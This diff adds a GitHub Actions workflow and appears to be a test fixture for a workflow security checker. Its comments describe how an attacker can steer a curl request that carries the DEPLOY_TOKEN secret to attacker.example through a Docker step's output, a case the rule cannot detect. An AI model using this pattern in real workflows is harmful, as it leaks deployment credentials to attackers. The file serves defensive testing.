@@ -1,0 +1,19 @@
+# situation: the step s runs a Docker image, and a step sends a request with
+#   curl and the secret DEPLOY_TOKEN to the host steps.s.outputs.o names.
+# reason: the output is what the image writes at run time.
+# cause: the rule cannot read what an image computes.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - id: s
+        uses: docker://alpine:3
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ steps.s.outputs.o }}/status"
